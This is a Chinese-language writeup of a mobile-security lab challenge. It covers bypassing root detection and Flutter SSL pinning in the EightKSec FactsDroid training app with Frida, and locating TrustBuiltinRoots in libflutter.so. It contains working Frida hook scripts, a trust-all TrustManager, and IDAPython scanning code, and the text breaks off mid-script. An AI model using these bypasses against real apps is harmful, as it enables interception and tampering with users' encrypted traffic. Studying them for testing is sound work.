# FactsDroid — Flutter 应用 SSL Pinning Bypass + MITM 响应篡改完整 Writeup

> 题目类型：移动端安全 | 平台：Android | 包名：`com.eightksec.factsdroid`
>
> 目标：在不修改 APK 的前提下，通过 Frida 动态 Hook 实现 Root 检测绕过、SSL Pinning Bypass，最终完成 MITM 攻击拦截并篡改 HTTPS API 响应。

**题目分类：移动端安全**。本题考察的是 **Flutter 框架逆向** + **BoringSSL SSL Pinning 绕过** + **arm64 native 函数定位** + **MITM 响应篡改** 的组合利用。

核心挑战可以用一句话概括：**Flutter 应用自带了一套完整的 TLS 实现（BoringSSL），它完全绕过 Android 系统的证书信任机制，所以你必须逆向 23MB 的 `libflutter.so`，找到加载系统证书的内部函数，然后通过 Frida 强制调用它。** 而这个函数没有任何符号导出——你需要通过 ADRP 指令搜索和 IDA 反编译才能找到它。

---

## 目录

- [第一章：你需要先知道的知识](#第一章你需要先知道的知识)
- [第二章：APK 静态分析——摸清目标是什么](#第二章apk-静态分析摸清目标是什么)
- [第三章：Root 检测绕过——六层 Hook 全覆盖](#第三章root-检测绕过六层-hook-全覆盖)
- [第四章：SSL Pinning 分析——为什么常规方法全部失效](#第四章ssl-pinning-分析为什么常规方法全部失效)
- [第五章：arm64 逆向——在大海捞针中定位 TrustBuiltinRoots](#第五章arm64-逆向在大海捞针中定位-trustbuiltinroots)
- [第六章：SSL Pinning Bypass——直接调用内部函数](#第六章ssl-pinning-bypass直接调用内部函数)
- [第七章：MITM 方案的曲折探索——从失败到成功](#第七章mitm-方案的曲折探索从失败到成功)
- [第八章：完整 Exploit 脚本](#第八章完整-exploit-脚本)
- [第九章：如何防御这类攻击](#第九章如何防御这类攻击)
- [第十章：总结](#第十章总结)

---

## 第一章：你需要先知道的知识

在讲这道题之前，先理解几个核心概念。如果你已经懂了可以跳过。

### 1.1 什么是 Flutter

Flutter 是 Google 开发的跨平台 UI 框架。跟 React Native 不同，Flutter **不使用系统的原生控件和网络栈**。它自带了一整套运行时：

```
普通 Android 应用：                    Flutter 应用：
┌───────────────────┐                ┌───────────────────┐
│  Java/Kotlin 代码  │                │  Dart 代码         │
│       ↓           │                │       ↓           │
│  Android SDK      │                │  Flutter Engine    │
│  (HttpURLConn)    │                │  (自带网络栈)      │
│       ↓           │                │       ↓           │
│  系统 SSL/TLS     │                │  BoringSSL         │
│  (系统 CA 证书)   │                │  (内置证书 bundle) │
│       ↓           │                │       ↓           │
│  Linux 内核       │                │  Linux 内核        │
└───────────────────┘                └───────────────────┘
```

关键区别：Flutter 应用的 HTTPS 请求**不走 Android 的 `HttpURLConnection` 或 `OkHttp`**，而是通过 Dart VM 调用内置的 BoringSSL 库完成 TLS 握手。这意味着：

- Java 层的 `TrustManager` Hook **完全无效**
- 系统设置里的 CA 证书**不会被使用**
- 你必须到 native 层（`libflutter.so`）里去找证书验证逻辑

> 💡 **打个比方**：普通 Android 应用像是一个会去政府机关（系统 CA）办手续的公民。Flutter 应用像是一个自带了私人文书（BoringSSL 内置证书）的人——它根本不去政府机关，你往政府机关塞多少文件（安装系统 CA）都没用。

### 1.2 什么是 SSL Pinning（证书固定）

SSL Pinning 是一种安全机制。正常的 HTTPS 连接会信任操作系统预装的所有 CA 证书（大约 100-200 个）。SSL Pinning 则更进一步——应用只信任**自己预置的特定证书或公钥**。

```
没有 SSL Pinning：                     有 SSL Pinning：
┌──────────────────┐                  ┌──────────────────┐
│ 应用连接服务器    │                  │ 应用连接服务器    │
│      ↓           │                  │      ↓           │
│ 服务器出示证书    │                  │ 服务器出示证书    │
│      ↓           │                  │      ↓           │
│ 系统验证：       │                  │ 应用验证：       │
│ "这个证书是不是  │                  │ "这个证书是不是  │
│  系统信任的 200  │                  │  我预置的那一个？"│
│  个 CA 之一？"   │                  │      ↓           │
│      ↓           │                  │ 只有完全匹配才通过│
│ 是 → 信任 ✅     │                  │ 不匹配 → 拒绝 ❌ │
└──────────────────┘                  └──────────────────┘
```

**为什么 SSL Pinning 阻止 MITM**：中间人攻击需要攻击者用自己的证书替换服务器证书。没有 SSL Pinning 时，只要攻击者的 CA 被系统信任就行（装一个自签名 CA 到系统里）。有 SSL Pinning 时，攻击者的证书永远不会匹配应用预置的证书。

**Flutter 的隐式 SSL Pinning**：Flutter 默认使用编译在 `libflutter.so` 里的证书 bundle，**不加载系统 CA**。这相当于一种隐式的 SSL Pinning——即使你往系统里装了自己的 CA，Flutter 也不看。

### 1.3 什么是 Frida

Frida 是一个动态二进制插桩（Dynamic Binary Instrumentation）工具。简单说，它让你能在**运行时**把 JavaScript 代码注入到目标进程中，拦截（Hook）任何函数调用，修改参数和返回值。

```
正常执行流程：                      Frida Hook 后：
┌───────────────┐                  ┌───────────────┐
│ 调用 foo(1,2) │                  │ 调用 foo(1,2) │
│      ↓        │                  │      ↓        │
│ foo 执行      │                  │ Frida 拦截！  │
│      ↓        │                  │ 改参数为(9,9) │
│ 返回结果      │                  │      ↓        │
└───────────────┘                  │ foo(9,9) 执行 │
                                   │      ↓        │
                                   │ 改返回值为 0  │
                                   │      ↓        │
                                   │ 返回 0        │
                                   └───────────────┘
```

Frida 的核心 API：

| API | 用途 | 示例 |
|-----|------|------|
| `Java.perform()` | 在 Java 虚拟机线程中执行代码 | Hook Java 方法 |
| `Java.use("类名")` | 获取 Java 类的引用 | `Java.use("java.io.File")` |
| `Interceptor.attach(addr, callbacks)` | Hook native 函数 | 拦截 `connect()`, `read()` 等 |
| `NativeFunction(addr, retType, argTypes)` | 把内存地址包装成可调用的函数 | 直接调用 `libflutter.so` 内部函数 |

**两种运行模式**：

| 模式 | 说明 | 适用场景 |
|------|------|---------|
| **spawn** | Frida 启动应用并立即注入 | 需要 Hook 早期初始化代码（如 SSL 初始化） |
| **attach** | 附加到已运行的进程 | 应用已启动，需要动态调试 |

> 💡 **在这道题中**：我们使用 spawn 模式，因为 SSL 初始化发生在应用启动阶段，必须尽早注入 Hook。

### 1.4 什么是 arm64 和 x86_64，为什么这很重要

CPU 有不同的"语言"（指令集）。Android 设备主要有两种：

| 架构 | 用在哪 | 指令集 |
|------|--------|--------|
| **arm64** (AArch64) | 真机、部分模拟器 | ARM 64位指令 |
| **x86_64** | 大部分 Android 模拟器 | Intel 64位指令 |

**关键点**：同一份 Flutter 引擎代码，在不同架构下编译出的 `libflutter.so` 完全不同。函数偏移地址、寄存器约定、指令编码全部不一样。

```
x86_64 libflutter.so:              arm64 libflutter.so:
TrustBuiltinRoots 在 0x953160      TrustBuiltinRoots 在 0x8413F8
指令: MOV RAX, [RCX+...]           指令: LDR X0, [X19, #...]
字符串引用: LEA + RIP 相对寻址      字符串引用: ADRP + ADD 页面寻址
```

> 💡 **这道题的陷阱**：我们的模拟器报告 CPU 是 `x86_64`，但应用实际运行在 `arm64` 转译模式下。如果你用 x86_64 的偏移地址去 Hook，要么 Hook 到错误的函数导致崩溃，要么什么也不会发生。我们花了大量时间才意识到这个问题。

### 1.5 什么是 MITM（中间人攻击）

MITM（Man-In-The-Middle）攻击是指攻击者把自己插入通信双方的中间，拦截并可能篡改双方的消息。

```
正常通信：
┌────────┐     HTTPS 请求      ┌────────┐
│  手机   │ ──────────────────→ │  服务器 │
│  App   │ ←────────────────── │        │
└────────┘     HTTPS 响应      └────────┘

MITM 攻击：
┌────────┐     请求      ┌──────────┐     请求      ┌────────┐
│  手机   │ ──────────→  │ 攻击者   │ ──────────→  │  服务器 │
│  App   │ ←──────────  │ (代理)   │ ←──────────  │        │
└────────┘     篡改的    └──────────┘     原始的     └────────┘
               响应                       请求
```

实施 HTTPS MITM 需要三个条件：
1. **网络重定向**：让应用的请求发到攻击者的代理（DNS 欺骗、iptables 等）
2. **证书信任**：让应用信任代理使用的证书（这就是为什么需要 SSL Pinning bypass）
3. **响应篡改**：代理收到服务器响应后，修改内容再转发给应用

---

## 第二章：APK 静态分析——摸清目标是什么

### 2.1 解包

拿到 APK 后，第一步是解包，看看里面有什么：

```bash
# apktool：解包 + 反汇编（能看到 AndroidManifest.xml、资源文件、smali 代码）
apktool d factsdroid.apk -o unpacked

# jadx：反编译为 Java 源码（可读性更好）
jadx -d java_src factsdroid.apk
```

### 2.2 AndroidManifest.xml 分析

`AndroidManifest.xml` 是 Android 应用的"身份证"，声明了应用需要的权限和组件。

```xml
<!-- unpacked/AndroidManifest.xml -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.eightksec.factsdroid">

    <!-- 唯一权限：网络访问。没有存储、相机等敏感权限。 -->
    <uses-permission android:name="android.permission.INTERNET"/>

    <!-- 自定义签名级权限（用于 ProfileInstaller 广播，不影响分析） -->
    <permission android:name="com.eightksec.factsdroid.DYNAMIC_RECEIVER_NOT_EXPORTED_PERMISSION"
                android:protectionLevel="signature"/>

    <application android:label="FactsDroid" ...>
        <!-- 单 Activity：典型的 Flutter 应用结构 -->
        <activity android:name="com.eightksec.factsdroid.MainActivity"
                  android:exported="true"
                  android:launchMode="singleTop">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
</manifest>
```

**分析结论**：
- 包名：`com.eightksec.factsdroid`（来自 EightKSec，安全培训公司）
- 单 Activity 应用 → 几乎可以确定是 Flutter
- 只有 `INTERNET` 权限 → 应用会发网络请求

### 2.3 识别 Flutter 框架

解包后的目录结构：

```
unpacked/
├── AndroidManifest.xml
├── lib/
│   ├── arm64-v8a/
│   │   └── libflutter.so      ← Flutter 引擎（约 23MB！）
│   └── x86_64/
│       └── libflutter.so      ← x86_64 版本的引擎
├── assets/
│   ├── flutter_assets/         ← Flutter 资源文件
│   │   ├── AssetManifest.json
│   │   ├── kernel_blob.bin     ← Dart 编译后的代码
│   │   └── ...
│   └── ...
└── res/                        ← Android 资源文件
```

**Flutter 应用特征**：
1. `libflutter.so` 存在 → Flutter 引擎
2. `flutter_assets/` 目录 → Flutter 资源包
3. `kernel_blob.bin` → Dart 代码（编译后的快照）
4. 只有 `MainActivity`，没有其他 Java Activity → Flutter 管理整个 UI

**为什么 `libflutter.so` 有 23MB？** 因为它包含了：
- Dart VM（虚拟机）
- BoringSSL（完整的 TLS 实现）
- Skia（图形渲染引擎）
- Dart 标准库的 native 实现
- 预置的根证书 bundle

这个 23MB 的二进制文件就是我们后面要逆向分析的目标。

### 2.4 发现 API 端点

通过 jadx 反编译的 Java 代码（主要是 `MainActivity`）可以看到应用通过 **Platform Channel** 与 Dart 层通信。Java 层主要负责 root 检测，实际的网络请求由 Dart 发起。

搜索字符串可以找到 API 端点：

```
https://uselessfacts.jsph.pl/api/v2/facts/random
```

用 curl 测试这个 API：

```bash
$ curl -s https://uselessfacts.jsph.pl/api/v2/facts/random | python3 -m json.tool
{
    "id": "45b12cfc736ceff39a78325d3416d136",
    "text": "Walt Disney holds the world record for the most Academy Awards...",
    "source": "Wikipedia",
    "source_url": "https://en.wikipedia.org/wiki/...",
    "language": "en",
    "permalink": "https://uselessfacts.jsph.pl/api/v2/facts/..."
}
```

**API 分析**：
- **方法**：GET
- **认证**：无
- **返回**：JSON，关键字段是 `text`（随机知识文本）
- **TLS**：使用 Let's Encrypt 证书

### 2.5 应用功能总结

综合分析，FactsDroid 的工作流程是：

```
┌───────────────────────────────────────────────┐
│ 1. 应用启动                                    │
│    ↓                                          │
│ 2. 检测设备是否 Root                           │
│    ├── 已 Root → 禁用 "Random Fact" 按钮 ❌    │
│    └── 未 Root → 启用按钮 ✅                   │
│         ↓                                     │
│ 3. 用户点击 "Random Fact" 按钮                 │
│    ↓                                          │
│ 4. Dart 代码发起 HTTPS GET 请求               │
│    → https://uselessfacts.jsph.pl/api/v2/...  │
│    ↓                                          │
│ 5. Flutter 引擎 (BoringSSL) 执行 TLS 握手     │
│    → 验证服务器证书（只信任内置证书 bundle）    │
│    ↓                                          │
│ 6. 收到 JSON 响应，解析 "text" 字段           │
│    ↓                                          │
│ 7. 在界面上显示随机知识                        │
└───────────────────────────────────────────────┘
```

**我们的攻击计划**：

| 防御层 | 对应的绕过方案 |
|--------|---------------|
| Root 检测 | Java + Native Hook 绕过 |
| SSL Pinning | 逆向 `libflutter.so`，找到并调用内部函数 |
| MITM 拦截 | Hook `read()` 拦截 TLS 流量 |

---

## 第三章：Root 检测绕过——六层 Hook 全覆盖

### 3.1 Root 检测的原理

Root 检测是 Android 安全的常见防线。Root 后的设备可以运行任意命令（包括 Frida），应用通过检测 root 特征来拒绝在 root 设备上工作。

FactsDroid 的 Root 检测可以从两个维度看：**从应用的检测手段来看，有三类检测方法**（Java 文件检查、Java 命令执行、Native 系统调用）；**从我们的绕过策略来看，需要六个 Hook 点**全部拦截。下文先按检测手段分类讲解原理，最后给出六层 Hook 的完整汇总。

```
┌──────────────────────────────────────────────────────┐
│ 第一层：Java — File.exists()                        │
│                                                      │
│   检查这些路径是否存在：                              │
│   /system/bin/su                                     │
│   /system/xbin/su                                    │
│   /sbin/su                                           │
│   /sbin/magisk                                       │
│   /data/adb/magisk                                   │
│   ... (共 20+ 个路径)                                │
│                                                      │
│   任何一个存在 → 判定为 Root                          │
└──────────────────────────────────────────────────────┘
         ↓ 如果 File.exists() 被 Hook 了？
┌──────────────────────────────────────────────────────┐
│ 第二层：Java — Runtime.exec()                        │
│                                                      │
│   尝试执行命令：                                      │
│   "su"                                               │
│   "which su"                                         │
│                                                      │
│   执行成功 → 判定为 Root                              │
│   抛异常（su: not found）→ 判定为未 Root              │
└──────────────────────────────────────────────────────┘
         ↓ 如果 Runtime.exec() 也被 Hook 了？
┌──────────────────────────────────────────────────────┐
│ 第三层：Native — access() / stat() / openat()        │
│                                                      │
│   Flutter 可能绕过 Java 层，直接通过 libc 系统调用    │
│   检测 su 文件：                                      │
│   access("/system/bin/su", F_OK)                     │
│   stat("/system/bin/su", &buf)                       │
│   openat(AT_FDCWD, "/system/bin/su", ...)            │
│                                                      │
│   返回 0（成功）→ 判定为 Root                         │
│   返回 -1（文件不存在）→ 判定为未 Root                │
└──────────────────────────────────────────────────────┘
```

### 3.2 第一层绕过：Hook File.exists()

`File.exists()` 是 Java 层的文件存在检查。我们 Hook 它，让它在检查 su 相关路径时返回 `false`：

```javascript
Java.perform(function() {
    var File = Java.use("java.io.File");

    File.exists.implementation = function() {
        var path = this.getAbsolutePath();  // 获取正在检查的路径

        // 如果路径包含 "su" 或 "magisk"，返回 false（假装不存在）
        if (path.indexOf("/su") !== -1 || path.indexOf("/magisk") !== -1) {
            console.log("[Root Bypass] File.exists(" + path + ") -> false");
            return false;
        }

        // 其他文件正常返回
        return this.exists();
    };
});
```

**这段代码做了什么？**

1. `Java.use("java.io.File")` — 获取 Java 的 `File` 类的引用
2. `.exists.implementation = function()` — 替换 `exists()` 方法的实现
3. `this.getAbsolutePath()` — 获取当前正在检查的文件路径
4. 如果路径包含 `/su` 或 `/magisk`，直接返回 `false`
5. 否则调用原始的 `this.exists()` 方法

### 3.3 第二层绕过：Hook Runtime.exec()

应用可能还会尝试**执行** `su` 命令，而不仅仅是检查文件是否存在。`Runtime.exec()` 有多个重载版本（一个接受 String，一个接受 String 数组），都需要 Hook：

```javascript
var Runtime = Java.use("java.lang.Runtime");

// 重载 1：exec(String command)
Runtime.exec.overload("java.lang.String").implementation = function(cmd) {
    if (cmd.indexOf("su") !== -1) {
        // 模拟 "su: not found" 错误
        throw Java.use("java.io.IOException").$new("su: not found");
    }
    return this.exec(cmd);  // 非 su 命令正常执行
};

// 重载 2：exec(String[] cmdArray)
Runtime.exec.overload("[Ljava.lang.String;").implementation = function(cmds) {
    if (cmds.length > 0 && cmds[0].indexOf("su") !== -1) {
        throw Java.use("java.io.IOException").$new("su: not found");
    }
    return this.exec(cmds);
};
```

**为什么要抛异常？** 因为当应用尝试执行 `su` 时，在未 root 的设备上，`su` 命令不存在，shell 会返回 `su: not found` 错误。我们模拟这个错误行为，让应用以为自己在未 root 的设备上。

### 3.4 第三层绕过：Hook Native 系统调用

这是最关键的一层。Java 层的 `File.exists()` 和 `Runtime.exec()` 底层都是通过 libc 的系统调用实现的。但 Flutter 应用可能**直接调用**这些 native 函数，完全绕过 Java 层：

```
Java File.exists()
    ↓ 底层调用
libc access("/system/bin/su", F_OK)
    ↓ 返回 0（文件存在）

但 Flutter 可能直接调用：
libc access("/system/bin/su", F_OK)  ← 跳过 Java 层！
```

所以我们还要 Hook 三个关键的 libc 函数：

**Hook access()** — 文件访问检查：

```javascript
var libc = Process.findModuleByName("libc.so");
var suPaths = {"/system/bin/su": 1, "/system/xbin/su": 1, "/sbin/su": 1};

Interceptor.attach(libc.findExportByName("access"), {
    // onEnter：函数被调用之前执行
    onEnter: function(args) {
        try {
            var path = args[0].readUtf8String();  // 读取第一个参数（文件路径）
            if (suPaths[path]) {
                this._block = true;  // 标记：需要拦截这次调用
            }
        } catch(e) {}
    },
    // onLeave：函数执行完毕后执行
    onLeave: function(retval) {
        if (this._block) {
            retval.replace(ptr(-1));  // 把返回值改成 -1（文件不存在）
            this._block = false;
        }
    }
});
```

**Hook stat()** — 文件状态检查（跟 access 类似）：

```javascript
Interceptor.attach(libc.findExportByName("stat"), {
    onEnter: function(args) {
        try {
            var path = args[0].readUtf8String();
            if (suPaths[path]) this._block = true;
        } catch(e) {}
    },
    onLeave: function(retval) {
        if (this._block) {
            retval.replace(ptr(-1));
            this._block = false;
        }
    }
});
```

**Hook openat()** — 文件打开（需要特殊处理，不能只改返回值）：

```javascript
Interceptor.attach(libc.findExportByName("openat"), {
    onEnter: function(args) {
        try {
            var path = args[1].readUtf8String();  // openat 的路径在第二个参数
            if (path && suPaths[path]) {
                // 不能只改返回值，因为 openat 可能还没执行
                // 直接把路径参数替换为一个不存在的路径
                args[1] = Memory.allocUtf8String("/nonexistent");
            }
        } catch(e) {}
    }
});
```

> 💡 **为什么 openat 的处理不同？** `access()` 和 `stat()` 只是"查询文件是否存在"，即使让它们真的执行了，也没什么副作用，事后改返回值就行。但 `openat()` 会**真正打开文件**——如果让内核打开了 su 文件，就产生了一个文件描述符，可能泄露信息（比如通过 `/proc/self/fd/` 能看到 su 被打开了）。所以我们在调用前就把路径参数改掉，让内核去打开一个不存在的文件，从根本上避免打开 su。

### 3.5 六层 Hook 的完整效果

```
应用的 Root 检测：                    我们的 Hook：
┌───────────────────┐               ┌───────────────────┐
│ File.exists("/su")│ ──Hook 1──→  │ return false      │
├───────────────────┤               ├───────────────────┤
│ Runtime.exec("su")│ ──Hook 2──→  │ throw IOException │  (String 版)
├───────────────────┤               ├───────────────────┤
│ Runtime.exec(su[])│ ──Hook 3──→  │ throw IOException │  (String[] 版)
├───────────────────┤               ├───────────────────┤
│ access("/su")     │ ──Hook 4──→  │ return -1         │
├───────────────────┤               ├───────────────────┤
│ stat("/su")       │ ──Hook 5──→  │ return -1         │
├───────────────────┤               ├───────────────────┤
│ openat("/su")     │ ──Hook 6──→  │ 改路径为 /xxx     │
└───────────────────┘               └───────────────────┘
         ↓                                   ↓
  所有检测都返回 "su 不存在"
         ↓
  应用判定：设备未 Root ✅
  "Random Fact" 按钮变为可用
```

---

## 第四章：SSL Pinning 分析——为什么常规方法全部失效

Root 绕过了，按钮可以点了。但点击按钮后，应用显示 "Failed to fetch fact"。为什么？因为 SSL 证书验证失败了。

### 4.1 先看看正常 Android 应用的 SSL Pinning Bypass 怎么做

对于普通 Android 应用，SSL Pinning bypass 的标准方案是 Hook `TrustManager`：

```javascript
// 这个方法对 Flutter 应用完全无效！这里只是展示"常规做法"
Java.perform(function() {
    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var SSLContext = Java.use("javax.net.ssl.SSLContext");

    // 创建一个信任所有证书的 TrustManager
    var TrustAllManager = Java.registerClass({
        name: "com.hack.TrustAllManager",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function() {},   // 不检查客户端证书
            checkServerTrusted: function() {},   // 不检查服务器证书 ← 关键！
            getAcceptedIssuers: function() { return []; }
        }
    });

    // 替换系统默认的 TrustManager
    SSLContext.init.overload("[Ljavax.net.ssl.KeyManager;",
                              "[Ljavax.net.ssl.TrustManager;",
                              "java.security.SecureRandom")
        .implementation = function(km, tm, sr) {
            this.init(km, [TrustAllManager.$new()], sr);
        };
});
```

### 4.2 为什么对 Flutter 无效

Flutter 的网络请求根本不经过 Java 层的 SSL 实现：

```
普通 Android 应用的 TLS 路径：
┌──────────────────┐
│ Java 代码         │
│       ↓          │
│ HttpURLConnection│
│       ↓          │
│ javax.net.ssl    │  ← Hook TrustManager 在这里生效
│       ↓          │
│ 系统 BoringSSL   │
│       ↓          │
│ connect() / read │
└──────────────────┘

Flutter 应用的 TLS 路径：
┌──────────────────┐
│ Dart 代码         │
│       ↓          │
│ dart:io          │
│       ↓          │
│ Dart VM native   │
│       ↓          │
│ libflutter.so    │  ← 内置的 BoringSSL，完全绕过 Java 层
│ 中的 BoringSSL   │     Hook TrustManager 完全无效！
│       ↓          │
│ connect() / read │
└──────────────────┘
```

**一句话总结**：Flutter 的 `libflutter.so` 内部编译了一份完整的 BoringSSL。这份 BoringSSL 使用自己的证书 store，不看 Android 系统的 CA 证书。Java 层的 Hook 根本碰不到它。

### 4.3 验证：抓包看到的错误

在只做了 Root bypass 的情况下，用 Frida Hook `write()` 和 `read()` 监视 TLS 流量：

```javascript
// 监视 TLS 握手
Interceptor.attach(libc.findExportByName("write"), {
    onEnter: function(args) {
        var buf = args[1];
        var len = args[2].toInt32();
        if (len > 5 && buf.readU8() === 0x16) {
            console.log("[TLS] ClientHello 发送，len=" + len);
        }
    }
});
```

运行结果：

```
[TLS] ClientHello 发送，len=...     ← 应用发送了 TLS 握手
[TLS] ServerHello 收到，len=...     ← 服务器回应了
[EXCEPTION] TlsException: Handshake error in client  ← 但验证失败了！
```

应用发出了 TLS ClientHello，服务器也回应了 ServerHello，但 BoringSSL 在验证服务器证书时失败了。

### 4.4 深入分析：为什么证书验证失败

进一步分析发现两个问题：

**问题 1：Flutter 使用内置的过期证书**

Flutter 引擎编译时内置了一份 Let's Encrypt 的中间证书。但这份证书是 R11 版本（旧版），而 API 服务器 `uselessfacts.jsph.pl` 使用的是 R13 版本签发的证书。证书链不匹配。

```
服务器证书链：
┌──────────────────┐     ┌──────────────────┐     ┌──────────────────┐
│ uselessfacts     │ ──→ │ Let's Encrypt    │ ──→ │ ISRG Root X1     │
│ 服务器证书       │ 签名│ R13 中间证书     │ 签名│ 根证书           │
└──────────────────┘     └──────────────────┘     └──────────────────┘

Flutter 内置的证书链：
┌──────────────────┐     ┌──────────────────┐     ┌──────────────────┐
│ ???              │ ──→ │ Let's Encrypt    │ ──→ │ ISRG Root X1     │
│                  │ 签名│ R11 中间证书(旧) │ 签名│ 根证书           │
└──────────────────┘     └──────────────────┘     └──────────────────┘

R11 ≠ R13 → 证书链验证失败！
```

**问题 2：SecurityContext 不加载系统 CA**

Flutter 的 `SecurityContext` 类有一个 `trustBuiltinRoots()` 方法，它会加载 Android 系统的 CA 证书（`/system/etc/security/cacerts/` 目录下的所有证书）。但默认情况下，这个方法**没有被调用**，或者被调用了但没有生效。

```
Android 系统 CA 证书目录：/system/etc/security/cacerts/
├── 0069bb6c.0    (GlobalSign Root CA)
├── 2e5ac55d.0    (DST Root CA X3)
├── 8d33f6d9.0    (ISRG Root X1)   ← 这个如果被加载，就能验证新证书！
├── ...           (共 100+ 个证书)
└── f387163d.0    (Amazon Root CA)

Flutter 的 SecurityContext：不看这个目录 ❌
```

**结论**：如果我们能让 Flutter 加载系统 CA 证书，SSL 验证就能通过（因为系统 CA 里包含 ISRG Root X1，可以验证 R13 签发的证书链）。

### 4.5 接下来要做什么

我们需要：
1. 逆向 `libflutter.so`，找到 `trustBuiltinRoots()` 对应的 native 函数
2. 弄清楚这个函数的参数和调用方式
3. 通过 Frida 的 `NativeFunction` 强制调用它

但问题是：`libflutter.so` 有 **23MB**，函数**没有导出符号**（被 strip 了），我们怎么找到这个函数？

这就是下一章的内容。

---

## 第五章：arm64 逆向——在大海捞针中定位 TrustBuiltinRoots

这一章是整个分析过程中最艰难的部分。我们需要在一个 23MB 的、没有符号信息的二进制文件中，找到加载系统 CA 证书的那个函数。就像在一本没有目录的百科全书里找一个特定的段落。

### 5.1 第一个坑：架构识别

在开始逆向之前，必须先确认应用实际运行的 CPU 架构。

```bash
# 检查模拟器的 CPU 架构
adb shell getprop ro.product.cpu.abi
# 输出: x86_64    ← 这是模拟器报告的架构

# 但检查应用实际运行在什么架构上
adb shell uname -m
# 输出: aarch64   ← 应用实际运行在 arm64 上！
```

**发生了什么？** 模拟器本身是 x86_64 的，但应用使用了 arm64 版本的 `libflutter.so`（APK 中同时包含两个版本），通过 Android 的 binary translation（转译层）运行。

**这意味着**：
- 我们需要逆向的是 `lib/arm64-v8a/libflutter.so`（23MB），不是 `lib/x86_64/libflutter.so`
- 所有函数偏移地址都以 arm64 版本为准
- x86_64 版本的偏移地址**完全不能用于 arm64**

```bash
# 从设备上拉取实际运行的 libflutter.so
adb pull /data/app/~~xxx/com.eightksec.factsdroid-xxx/lib/arm64/libflutter.so libflutter_arm64.so

# 确认文件信息
file libflutter_arm64.so
# 输出: ELF 64-bit LSB shared object, ARM aarch64, ...
```

### 5.2 定位思路：从字符串到函数

我们的目标是找到 `SecurityContext_TrustBuiltinRoots` 函数。它做的事情是加载 `/system/etc/security/cacerts` 目录下的系统 CA 证书。

**逆向策略**：既然我们知道这个函数会引用 `/system/etc/security/cacerts` 这个字符串，那么只要找到谁引用了这个字符串，就找到了这个函数。

```
我们的搜索路径：
┌──────────────────────────────────────────────┐
│ 1. 找到字符串在二进制文件中的位置              │
│    "/system/etc/security/cacerts" → 0x?????? │
│                    ↓                         │
│ 2. 找到哪些代码引用了这个字符串               │
│    ADRP + ADD 指令对 → 函数 sub_8413F8       │
│                    ↓                         │
│ 3. 反编译这个函数，确认它是 TrustBuiltinRoots  │
│    IDA Pro 反编译 → 包含证书加载逻辑 ✓       │
└──────────────────────────────────────────────┘
```

### 5.3 第一步：在内存中搜索目标字符串

用 Frida 在运行时搜索字符串。我们先搜索 `SecurityContext_TrustBuiltinRoots` 这个 Dart native 函数名（Flutter 的 native 函数通常以这种格式命名）：

```javascript
// arm64_find.js — 在 libflutter.so 的内存中搜索字符串
function doHook() {
    var libflutter = Process.findModuleByName("libflutter.so");
    if (!libflutter) { setTimeout(doHook, 300); return; }
    console.log("[*] libflutter base=" + libflutter.base + " size=" + libflutter.size);

    // 构造搜索模式：把字符串转成十六进制字节序列
    var targetStr = "SecurityContext_TrustBuiltinRoots";
    var pattern = "";
    for (var i = 0; i < targetStr.length; i++) {
        pattern += ("0" + targetStr.charCodeAt(i).toString(16)).slice(-2) + " ";
    }
    // pattern = "53 65 63 75 72 69 74 79 43 6f 6e 74 65 78 74 5f ..."

    // 遍历 libflutter.so 的所有可读内存区域，搜索字符串
    Process.enumerateRanges('r--').forEach(function(range) {
        if (range.base < libflutter.base ||
            range.base >= libflutter.base.add(libflutter.size)) return;
        try {
            Memory.scan(range.base, range.size, pattern, {
                onMatch: function(addr, size) {
                    console.log("[+] Found at " + addr +
                        " (offset 0x" + addr.sub(libflutter.base).toString(16) + ")");
                }
            });
        } catch(e) {}
    });
}
```

运行结果：**找到了字符串！** 这证实了 `SecurityContext_TrustBuiltinRoots` 这个 native 函数确实存在于 libflutter 中。但找到字符串的位置还不够——我们需要找到**代码中谁引用了这个函数名**（Dart VM 的 native 函数注册表），从而定位到函数的实际代码地址。

但这里有一个捷径：我们已经知道这个函数的功能是加载 `/system/etc/security/cacerts` 目录下的系统 CA 证书。所以我们可以直接搜索引用这个**路径字符串**的代码，跳过函数注册表这一层。这就进入了下一步：理解 ARM64 的字符串引用机制，然后用 IDA 定位引用点。

### 5.4 第二步：理解 ARM64 如何引用字符串

在 x86_64 中，代码引用字符串使用 `LEA` 指令 + RIP 相对寻址。但在 ARM64 中，引用一个 64 位地址需要两条指令配合：

```
ARM64 字符串引用机制：

ADRP X0, #page       ← 加载字符串所在的 4KB 页的基地址到 X0
ADD  X0, X0, #offset ← 加上页内偏移，得到完整地址

例如，字符串在 0x1BB357：
ADRP X0, #0x1BB000   ← 加载 0x1BB000 到 X0（页对齐，低 12 位清零）
ADD  X0, X0, #0x357  ← X0 = 0x1BB000 + 0x357 = 0x1BB357
```

> 💡 **为什么这么麻烦？** ARM64 的单条指令只有 4 字节（32 位），放不下一个 64 位地址。所以 ARM64 把地址加载拆成两步：`ADRP` 用 19 位立即数乘以 4KB 作为页偏移，`ADD` 用 12 位立即数作为页内偏移。两步组合就能定位到任意地址。

**我们的思路**：既然字符串引用一定是 `ADRP + ADD` 指令对，我们可以扫描代码段，计算每条 ADRP 指令的目标地址，看哪个指向我们的字符串。

### 5.5 第三步：通过 IDA 定位引用

将 `libflutter_arm64.so` 加载到 IDA Pro 中，用 IDAPython 脚本搜索引用 `/system/etc/security/cacerts` 字符串的 ADRP+ADD 指令对：

```python
# IDAPython 脚本：搜索引用特定字符串的 ADRP+ADD 指令对
import idautils
import idc
import ida_bytes

target_string = "/system/etc/security/cacerts"

# Step 1: 找到字符串在二进制中的偏移
string_addr = ida_bytes.bin_search(
    0, ida_bytes.get_segm_end(0),
    target_string.encode(), None,
    ida_bytes.BIN_SEARCH_FORWARD
)
print(f"String at: 0x{string_addr:X}")

string_page = string_addr & ~0xFFF  # 页对齐（低 12 位清零）
string_off  = string_addr & 0xFFF   # 页内偏移

# Step 2: 遍历代码段，找 ADRP 指令
for seg in idautils.Segments():
    seg_start = idc.get_segm_start(seg)
    seg_end   = idc.get_segm_end(seg)

    addr = seg_start
    while addr < seg_end:
        insn = idc.print_insn_mnem(addr)
        if insn == "ADRP":
            # 计算 ADRP 的目标地址
            op_val = idc.get_operand_value(addr, 1)
